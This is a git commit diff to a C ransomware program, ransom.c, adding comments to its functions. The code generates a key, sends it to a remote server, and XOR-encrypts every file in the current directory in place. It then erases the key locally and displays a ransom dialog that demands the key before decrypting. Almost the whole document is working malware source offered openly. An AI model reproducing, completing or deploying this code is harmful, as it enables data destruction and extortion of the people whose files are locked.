aac98675f17f3b1e349db4a3a68ba02083502449
AI-fergan <ifrganvrcturh@gmail.com>
2024-03-31 17:30:22 +0300

    Added comments to the ransom

--- ransom.c
+++ ransom.c
@@ -20,23 +20,53 @@
 
 #define DBG
 
+/*
+This funciton encrypt the memory of buffer.
+input:
+buffer - the pointer to the buffer for encryption.
+size - the size of the buffer.
+key - key for encryption.
+output: null.
+*/
 void encrypt_mem(char *buffer, size_t size, unsigned long key) {
+    //loop over all the buffer
     for (size_t i = 0; i < size; i++) {
         buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
     }
 }
 
+/*
+This funciton decrypt the memory of buffer.
+input:
+buffer - the pointer to the buffer for encryption.
+size - the size of the buffer.
+key - key for encryption.
+output: null.
+*/
 void decrypt_mem(char *buffer, size_t size, unsigned long key) {
+    //loop over all the buffer
     for (size_t i = 0; i < size; i++) {
         buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
     }
 }
 
+/*
+This function check if the file name isnt "." | ".." | "ransom".
+input:
+file - the file name.
+output: if the name is valid.
+*/
 int valid_file(const char* file) {
     return strcmp(file, ".") && strcmp(file, "..") && strcmp(file, "ransom");
 }
 
-int send_key(unsigned long key){
+/*
+This function send the key to the server.
+input:
+key - the key to send to the server.
+output: null.
+*/
+void send_key(unsigned long key){
     int sock = 0;
     struct sockaddr_in serv_addr;
 
@@ -77,13 +107,12 @@ int send_key(unsigned long key){
     close(sock);
 }
 
-void print_char_bits(char c) {
-    for (int i = 7; i >= 0; i--) {
-        printf("%d", (c & (1 << i)) ? 1 : 0);
-    }
-    printf(" magic\n");
-}
-
+/*
+This function authorized the key by manipulate it with some actions and return it back.
+input:
+key - the key to authorized.
+output: the key after the authorized.
+*/
 unsigned long authorized_key(unsigned long key){
     char magic = (char)key;
     magic &= 0x0F;
@@ -96,51 +125,81 @@ unsigned long authorized_key(unsigned long key){
     return key;
 }
 
+/*
+This function get key and return if it valid by the key syntax.
+input:
+key - the key for check.
+output: if the key is valid.
+*/
 int validation_key(unsigned long key){
     char magic_1, magic_2;
+
+    //Check if the number is even
     if(key % 2 != 0){
         return 0;
     }
 
+    //get the 4 bits of the magic 1
     key = key >> 1;
     magic_1 = (char)key;
     magic_1 &= 0x0F;
 
     key = key >> 4;
 
+    //check if the validation number is 1
     if(key % 2 != 1){
         return 0;
     }
     
+    //get the 4 bits of the magic 2
     key = key >> 1;
     magic_2 = (char)key;
     magic_2 &= 0x0F;
 
+    //check if the two magics numbers is equals
     if(magic_1 != magic_2)  {
         return 0;
     }
     return 1;
 }
-unsigned long generate_key(){
+
+/*
+This functions generate new key.
+input: null.
+output: the key number.
+*/
+unsigned long generate_key(void){
     unsigned long key;
     int i = 0;
     srand(time(NULL));  
 
+    //rand return 2 bytes of random number, then store all the numbers in the key.
     for(i = 0; i < sizeof(unsigned long); i += 2){
         key += rand();
         key << 2;
     }
     
+    //authorized the key...
     key = authorized_key(key);
 
     return key;
 }
 
+/*
+This function encrypt all the files in the folder.
+input:
+key - the key for encryption.
+dir_name - the  path to the dir for encryption.
+output: null.
+*/
 void encrypt_dir(unsigned long key, char* dir_name){
     DIR *d;
     struct dirent *dir;
     d = opendir(dir_name);
+
+    //check if the dir is exists.
     if (d) {
+        //loop over all the dir
         while ((dir = readdir(d)) != NULL) {
             int fd;
             
@@ -153,6 +212,7 @@ void encrypt_dir(unsigned long key, char* dir_name){
                 return;
             }
 
+            //check if the path is of file or dir.
             if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
                 fd = open(dir->d_name, O_RDWR);
 
@@ -164,10 +224,10 @@ void encrypt_dir(unsigned long key, char* dir_name){
                     return;
                 }
 
-                // XOR the file contents with the key
+                //encrypt the memory of the file with the key
                 encrypt_mem(file_contents, path_stat.st_size, key);
                 
-
+                //unmap of file content from the memory
                 if (munmap(file_contents, path_stat.st_size) == -1) {
                     perror("Error unmapping file from memory");
                     close(fd);
@@ -192,11 +252,21 @@ void encrypt_dir(unsigned long key, char* dir_name){
     } 
 }
 
+/*
+This function decrypt all the files in the folder.
+input:
+key - the key for decryption.
+dir_name - the  path to the dir for decryption.
+output: null.
+*/
 void decrypt_dir(unsigned long key, char* dir_name){
     DIR *d;
     struct dirent *dir;
     d = opendir(dir_name);
+
+    //check if the dir is exists.
     if (d) {
+        //loop over all the dir
         while ((dir = readdir(d)) != NULL) {
             int fd;
             
@@ -209,6 +279,7 @@ void decrypt_dir(unsigned long key, char* dir_name){
                 return;
             }
 
+            //check if the path is of file or dir.
             if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
                 fd = open(dir->d_name, O_RDWR);
 
@@ -220,10 +291,10 @@ void decrypt_dir(unsigned long key, char* dir_name){
                     return;
                 }
 
-                // XOR the file contents with the key
+                //decrypt the memory of the file with the key
                 decrypt_mem(file_contents, path_stat.st_size, key);
                 
-
+                //unmap of file content from the memory
                 if (munmap(file_contents, path_stat.st_size) == -1) {
                     perror("Error unmapping file from memory");
                     close(fd);
@@ -246,7 +317,12 @@ void decrypt_dir(unsigned long key, char* dir_name){
     } 
 }
 
-unsigned long ransom_dialog(){  
+/*
+This function start ransom dialog with the user.
+input: null.
+output: key for decryption.
+*/
+unsigned long ransom_dialog(void){  
     unsigned long key;                                                                                                                    
     system("clear");
     printf("RRRRRRRRRRRRRRRRR                             tttt          \n");
@@ -265,24 +341,36 @@ unsigned long ransom_dialog(){
     printf("R::::::R     R:::::Ra:::::aaaa::::::a      tt::::::::::::::t\n");
     printf("R::::::R     R:::::R a::::::::::aa:::a       tt:::::::::::tt\n");
     printf("RRRRRRRR     RRRRRRR  aaaaaaaaaa  aaaa         ttttttttttt  \n\n\n");
+
+    //get the key from the user
     do {
+
         printf("Key: ");
         scanf("%lu", &key);
         getchar();
-    } while (!validation_key(key));
-    
+
+    } while (!validation_key(key)); //loop until the user give valid key    
 
     return key;
 }
 
 int main(void){
+    //key scope
     {
+        //generate new random key
         unsigned long key = generate_key();
+
+        //send the key to the server
         send_key(key);
+
+        //encrypt the curr dir of the ransom
         encrypt_dir(key, ".");
+
+        //delete the key from the stack
         key ^= key;        
     }    
 
+    //get the key from the user then decrypt the data
     decrypt_dir(ransom_dialog(), ".");
 
     return 0;
